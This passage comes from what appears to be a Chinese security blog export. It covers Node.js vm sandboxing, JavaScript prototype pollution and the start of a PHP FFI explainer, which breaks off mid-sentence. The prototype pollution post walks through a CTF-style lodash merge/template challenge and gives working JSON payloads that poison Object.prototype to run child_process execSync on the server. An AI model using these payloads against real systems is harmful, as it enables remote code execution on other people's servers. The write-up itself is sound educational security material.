class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># xxx.<span class="property">js</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> local_var = <span class="string">&quot;local&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm_var = vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;local_var = &quot;vm&quot;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm_var); <span class="comment">//vm</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(local_var); <span class="comment">//local</span></span><br><span class="line"><span class="comment">//local_var 的值没变，即这个runAPI接口无法访问本地作用域</span></span><br></pre></td></tr></table></figure><p>换句话说，这个沙箱成功隔离了，沙箱内对于变量的操作没有污染到挂载到全局变量的变量。  </p><h4 id="vm-createContext-sandbox-："><a href="#vm-createContext-sandbox-：" class="headerlink" title="vm.createContext([sandbox])："></a>vm.createContext([sandbox])：</h4><p>在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。  </p><p><img src="/img/vm3.png" alt="vm3"></p><h4 id="vm-runInContext-code-contextifiedSandbox-options"><a href="#vm-runInContext-code-contextifiedSandbox-options" class="headerlink" title="vm.runInContext(code, contextifiedSandbox[, options])"></a>vm.runInContext(code, contextifiedSandbox[, options])</h4><p>配合creatcontext使用</p><p>参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">global_var</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">global_var</span>: <span class="number">2</span> &#125;;</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);  <span class="comment">// 创建一个上下文隔离对象</span></span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;global_var *=2;&#x27;</span>, sandbox);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(sandbox); <span class="comment">//&#123; global_var: 4 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(global_var); <span class="comment">//1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，上下文中的globalVar在输出中为(2*2 &#x3D; 4)，但是globalVar的值仍为1，沙箱内部无法访问global中的属性。 </p><h4 id="vm-runInNewContext-code-sandbox-options"><a href="#vm-runInNewContext-code-sandbox-options" class="headerlink" title="vm.runInNewContext(code[, sandbox][, options])"></a>vm.runInNewContext(code[, sandbox][, options])</h4><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。  </p><h4 id="vm-Script类"><a href="#vm-Script类" class="headerlink" title="vm.Script类"></a>vm.Script类</h4><p>vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。  </p><h4 id="new-vm-Script-code-options"><a href="#new-vm-Script-code-options" class="headerlink" title="new vm.Script(code, options)"></a>new vm.Script(code, options)</h4><p>创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br>code：要被解析的JavaScript代码  </p><pre><code class="js">const vm = require(&#39;vm&#39;);const sandbox = &#123; animal: &#39;cat&#39;, count: 1 &#125;;const script = new vm.Script(&#39;count +=1; name = &quot;Tom&quot;;&#39;);  //编译codeconst context = vm.createContext(sandbox);  // 创建一个上下文隔离对象script.runInContext(context);   // 在指定的下文里执行code并返回其结果console.log(sandbox); //&#123; animal: &#39;cat&#39;, count: 2, name: &#39;Tom&#39; &#125;</code></pre><p>script对象可以通过runInContext运行</p><p>vm中最关键的就是 上下文context ，vm能逃逸出来的原理也就是因为 context 并没有拦截针对外部的 constructor 和 __proto__等属性 的访问  </p><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>参考文章:<br><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E6%B2%99%E7%AE%B1%E6%8A%80%E6%9C%AF.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/%E6%B2%99%E7%AE%B1%E6%8A%80%E6%9C%AF.html</a><br><a href="https://blog.csdn.net/qq_61768489/article/details/130138439">https://blog.csdn.net/qq_61768489/article/details/130138439</a><br><a href="https://www.anquanke.com/post/id/207283">https://www.anquanke.com/post/id/207283</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js原型链污染</title>
      <link href="/2024/06/12/javascript/"/>
      <url>/2024/06/12/javascript/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：js 和 ActionScript3 有些像。定义类都是以构造函数的方式来定义的。  </p></blockquote><h1 id="prototype-和-proto-的定义。"><a href="#prototype-和-proto-的定义。" class="headerlink" title="prototype 和 proto 的定义。"></a>prototype 和 <strong>proto</strong> 的定义。</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">conslog</span>(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title function_">test</span>()</span><br></pre></td></tr></table></figure><p>当然 ECS6 增加了 <code>class</code> 语法(其实只是一个语法糖罢了，跟 python 的列表推导式性质一样)  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">//用来初始化类（当然也可以调用父类的构造函数）</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">log</span> = <span class="keyword">function</span> (<span class="params">message</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myTest = <span class="keyword">new</span> <span class="title class_">Test</span>()</span><br><span class="line">myTest.<span class="title function_">log</span>(<span class="string">&#x27;111&#x27;</span>)</span><br></pre></td></tr></table></figure><p>但是这样其实有个问题，每当我们新建一个 Test 对象时，<code>this.log = function就会调用一次</code>, 其实意味着，每当我们创建一个新的 Test 实例时，都会创建一个新的 log 函数，这样多个实例每个都有自己的 log 函数副本，这样不仅会导致 <code>内存滥用</code>，还不易于 <code>维护管理</code>。这个时候就要使用（prototype）了。  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">var</span> = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Test</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">log</span> = <span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">var</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test = <span class="keyword">new</span> <span class="title class_">Test</span>()</span><br><span class="line">test.<span class="title function_">log</span>()</span><br></pre></td></tr></table></figure><hr><p><code>prototype</code><br>原型对象：每个 JavaScript 函数都有一个 prototype 属性，指向一个对象，这个对象称为原型对象。当你使用 new 关键字从构造函数创建对象时，这些对象会从构造函数的原型对象继承属性和方法。</p><blockquote><p>其实很好理解，其实就是一个类里面的其他方法 (因为这个类先初始化了，所以其他方法可以访问初始化定义的属性(变量)或方法(函数)。)</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hip_hop</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hip_hop_god</span> extend <span class="title class_">Hip</span>_hop &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,album</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">album</span> = album</span><br><span class="line">        <span class="variable language_">super</span>(name)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">rap</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;$&#123;this.name&#125;的$&#123;this.album&#125;是一张神专&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Ye</span> = <span class="keyword">new</span> <span class="title class_">Hip</span>_hop_god(<span class="string">&#x27;Kanye_West&#x27;</span>,<span class="string">&#x27;ye&#x27;</span>)</span><br><span class="line"><span class="title class_">Ye</span>.<span class="title function_">say</span>()</span><br><span class="line"><span class="title class_">Ye</span>.<span class="title function_">rap</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Kanye_West</span></span><br><span class="line"><span class="comment">//Kanye_West的ye是一张神专</span></span><br></pre></td></tr></table></figure><p>现在有一个问题，我们能通过 prototype 来访问原型，但是无法继承由原型已经实例化的对象，所以要用到 <strong>proto</strong> 方法</p><blockquote><p><em>一个 Foo 类实例化出来的 foo 对象，可以通过 foo.<strong>proto</strong> 属性来访问 Foo 类</em> 的原型  </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span> = <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span> =&gt; 对象.<span class="property">proto</span>=构造器(构造函数).<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/js_proto1.png" alt="1715763047353">  </p><ol><li>prototypie 是一个类的属性，所有类对象在实例化的时候将会拥有 prototype 中的属性和方法</li><li><strong>proto</strong> 是每一个类所有的方法，指向这个对象所在类的 prototype 属性。</li></ol><hr><ul><li>小知识：类是定义，对象是实体，实例化是创建实体的过程。类提供了创建对象的详细蓝图，对象是这些蓝图的具体实现，实例化则是将类从理论转化为实际的机制。</li></ul><h1 id="javascript-的原型链继承"><a href="#javascript-的原型链继承" class="headerlink" title="javascript 的原型链继承"></a>javascript 的原型链继承</h1><p>以一个简单的例子来看：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Kanye_West</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;kanye&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">album</span> = <span class="string">&#x27;College_Drop_out&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Ye_West</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;ye&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Ye</span>_West.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Kanye</span>_West()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> god = <span class="keyword">new</span> <span class="title class_">Ye</span>_West()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`god&#x27;s name is <span class="subst">$&#123;god.name&#125;</span>,his first album is <span class="subst">$&#123;god.album&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1715818302468.png" alt="1715818302468">  </p><p>对于对象 Ye_West，在调用 Ye_West.album 的时候，实际上 JavaScript 引擎会进行如下操作：</p><ol><li>在对象 Ye_West 中寻找 album</li><li>如果找不到，则在 Ye_West.<strong>proto</strong> 中寻找 album</li><li>如果仍然找不到，则继续在 Ye_West._<em>proto</em>_.<strong>proto</strong> 中寻找 album</li><li>依次寻找，直到找到 null 结束。比如，<code>Object.prototype的__proto__就是null</code></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>这里一样的还是来一个例子。一个没有父类的类 test 的 test.__proto_ <em>是 Object,</em> <em>即 test 是一个 Object 类的实例</em>_</p><p><img src="/img/1715819378374.png" alt="1715819378374">  </p><h1 id="适用原型链污染的情况"><a href="#适用原型链污染的情况" class="headerlink" title="适用原型链污染的情况"></a>适用原型链污染的情况</h1><ol><li>merge()  <strong>深度合并</strong></li><li>clone()   <strong>其实就是将待操作的对象 merge 到一个空对象中</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target,source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]) <span class="comment">//递归调用</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实就是找能够控制数组（对象）的“键名”的操作来使用 <code>__proto__</code>  </p><p>__核心操作__：target [key] &#x3D; source [key]，如果我们把 source 里面的一个键值对的键换成‘__proto__’  </p><p>来个例子：<br>合并成功但是污染失败：<br><img src="/img/1715820752703.png" alt="1715820752703">  </p><blockquote><p>原因：首先要明确的一点是：我们要的效果是 a.__proto__.b &#x3D; 2, 这样才能污染到 Object 层。  </p></blockquote><p>看图，很清晰的能明白，如果使用：let o2 &#x3D; {a: 2,”__proto__”:{b: 1}}, 则效果是：o2[__proto__] &#x3D; {b: 1}，意思是 o2 的原型就是{b: 1}而不是 Object 了。<br><img src="/img/1715824762416.png" alt="1715824762416">  </p><p>那就很简单了，JSON 解析的情况下，<strong>proto</strong> 会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历 o2 的时候会存在这个键。  </p><p><img src="/img/1715827953810.png" alt="1715827953810">  </p><p>例题：thejs 来看：  </p><p><img src="/img/1715828137939.png" alt="1715828137939"><br><img src="/img/1715828142987.png" alt="1715828142987"><br><img src="/img/1715828153454.png" alt="1715828153454">  </p><p>源码：  <a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) &#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.<span class="title function_">template</span>(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = <span class="title function_">compiled</span>(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">language</span>: data.<span class="property">language</span>, </span><br><span class="line">        <span class="attr">category</span>: data.<span class="property">category</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash 的 merge 有漏洞，根据以下构造 payload （记得把<code>x-www-form-urlencoded</code>改成<code>json</code>） </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="property">sourceURL</span> + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">attempt</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Function 其实有点像 eval</p><blockquote><p>{“__proto___”: {“ sourceURL “: “\u000areturn ()&#x3D;&gt;{for (var a in {}) {delete Object.prototype[a];}return global.process.mainModule.constructor._load(‘child_process’).execSync(‘whoami’)}\u000a&#x2F;&#x2F;“}}  </p></blockquote><ul><li><code>\u000a</code>: 换行符，可以让代码另起一行重新开始运行。</li><li><code>for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125;</code> : 环境不隔离的情况删掉属性，现在单独靶机的情况没什么用了。</li><li><code>\u000a//</code>: 为了把这个格式注释掉，只留下我们的 payload <code>sourceURL + &#39;return &#39; + source</code></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;sourceURL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u000areturn ()=&gt;&#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&#125;\u000a//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;sourceURL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u000areturn ()=&gt;&#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&#125;\u000a//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="最后的最后"><a href="#最后的最后" class="headerlink" title="最后的最后"></a>最后的最后</h1><p>express 框架能够通过 Content-Type 来解析请求 Body  </p><p>ps：express+ejs 相当于 flask + jinja2 , 洞一大堆。</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FFI真解</title>
      <link href="/2024/02/26/FFI/"/>
      <url>/2024/02/26/FFI/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-FFI真解"><a href="#PHP-FFI真解" class="headerlink" title="PHP FFI真解"></a>PHP FFI真解</h1><h2 id="PHP的扩展方式"><a href="#PHP的扩展方式" class="headerlink" title="PHP的扩展方式"></a>PHP的扩展方式</h2><h3 id="传统扩展"><a href="#传统扩展" class="headerlink" title="传统扩展"></a>传统扩展</h3><p><code>PHP 传统扩展</code>是通过 <strong>C 语言</strong> 编写的，用于扩展 PHP 功能的动态链接库（如 <code>.so</code> 或 <code>.dll</code> 文件）。这些扩展允许 PHP 调用 C 代码、操作底层系统资源（如文件、内存等）或集成第三方库（如 <code>curl</code>、<code>openssl</code>、<code>gd</code> 等）。</p><p>这需要用PHP专用的生成配置文件的工具<code>phpize</code>需要用 C 语言编写 PHP 扩展函数或类,编写好扩展代码后，使用 <code>phpize</code> 生成配置文件，并通过 <code>./configure</code>、<code>make</code>、<code>make install</code> 将扩展编译为 <code>.so</code> 文件。</p><p><strong>加载扩展</strong>：在 <code>php.ini</code> 中添加扩展路径，PHP 在运行时会加载这个 C 扩展库。</p><h4 id="传统扩展的核心概念"><a href="#传统扩展的核心概念" class="headerlink" title="传统扩展的核心概念"></a>传统扩展的核心概念</h4><ol><li><strong>Zend 引擎</strong>：PHP 的内核是 Zend 引擎，它负责 PHP 的编译、执行和内存管理。编写扩展时，开发者需要与 Zend 引擎进行交互，理解它的生命周期和 API。</li><li><strong>PHP 扩展宏</strong>：PHP 提供了大量的宏和函数来简化 C 扩展的开发，比如 <code>PHP_FUNCTION()</code> 用于定义一个 PHP 函数，<code>ZEND_BEGIN_ARG_INFO()</code> 用于描述参数等。</li><li><strong>内存管理</strong>：由于 PHP 使用了自己的内存管理机制（垃圾回收机制等），开发者在编写 C 扩展时需要特别注意内存分配和释放，避免内存泄漏或不安全的操作。</li></ol><p>场景：</p><ul><li><strong>性能需求</strong>：需要极高性能时，如处理大量数据或复杂算法，C 代码的执行速度比纯 PHP 快得多。</li><li><strong>与操作系统交互</strong>：需要直接操作文件系统、网络、数据库等底层资源。</li><li><strong>与第三方库集成</strong>：将已有的 C&#x2F;C++ 库（如 <code>curl</code>、<code>openssl</code>）集成到 PHP 中。</li></ul><blockquote><p>缺点：</p><ol><li><p>只可惜开发难度太高，不深入理解zend和C无法写出</p></li><li><p>每次修改扩展后都需要重新编译、打包和部署，并且在不同的平台上可能需要不同的编译配置。</p></li><li><p><strong>PHP 版本兼容性</strong>：由于 Zend 引擎的变化，扩展可能在不同版本的 PHP 中不兼容，需要手动调整代码。</p></li></ol></blockquote><h3 id="新的FFI扩展-PHP7-3以后"><a href="#新的FFI扩展-PHP7-3以后" class="headerlink" title="新的FFI扩展(PHP7.3以后)"></a>新的FFI扩展(PHP7.3以后)</h3><p>FFI 是 PHP 7.4 引入的扩展，允许 PHP 直接调用本地的 C 函数、使用 C 结构体，并进行内存操作，而无需像传统扩展那样编写、编译和安装 C 扩展。FFI 提供了一种运行时的方式，PHP 可以直接通过字符串定义和操作 C 语言中的符号。</p><h4 id="更简单的流程"><a href="#更简单的流程" class="headerlink" title="更简单的流程"></a>更简单的流程</h4><ol><li><strong>声明C代码接口</strong>：可以用<code>FFI::cdef()</code>函数直接定义要调用的C函数或结构体的接口。这些接口可以是共享库（如 <code>.so</code> 或 <code>.dll</code> 文件）中定义的函数。</li><li><strong>加载共享库</strong>：通过 <code>FFI::load()</code> 加载系统中的共享库文件。然后在 PHP 中可以像调用普通 PHP 函数一样调用 C 函数。</li><li><strong>调用 C 函数</strong>：一旦共享库加载成功，PHP 就可以调用该库中的函数，并可以操作 C 语言的变量和结构体。</li></ol><h4 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h4><p><strong>C 代码接口</strong>：通过 <code>FFI::cdef()</code> 声明 C 函数和结构体的签名，PHP 会基于这些签名与底层库进行交互。</p><p><strong>共享库</strong>：FFI 需要指定一个共享库（<code>.so</code> 或 <code>.dll</code> 文件）来加载这些符号。这与传统扩展不同，传统扩展是直接将 C 代码编译为 PHP 扩展，而 FFI 是通过动态加载共享库。</p><p><strong>内存操作</strong>：FFI 允许直接操作底层的内存地址，甚至可以通过 PHP 操作指针和内存块。这对高级开发者很有用，但也存在潜在的安全隐患。</p><p> 场景：</p><p><strong>快速原型开发</strong>：如果需要快速集成某些本地库或调用系统函数，FFI 非常方便，无需编写扩展、编译和安装。</p><p><strong>灵活性</strong>：在不需要极致性能的情况下，FFI 提供了一种动态的方式调用 C 函数，尤其适合那些不熟悉 C 扩展开发的 PHP 开发者。</p><p><strong>简单函数调用</strong>：适合调用少量的 C 函数，或者做一些简单的系统交互。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><p>在 PHP 中，<code>::</code> 是一种 <strong>范围解析操作符</strong>（Scope Resolution Operator），用于访问类中的 <strong>静态成员</strong>、<strong>常量</strong>、<strong>方法</strong> 或者用于调用 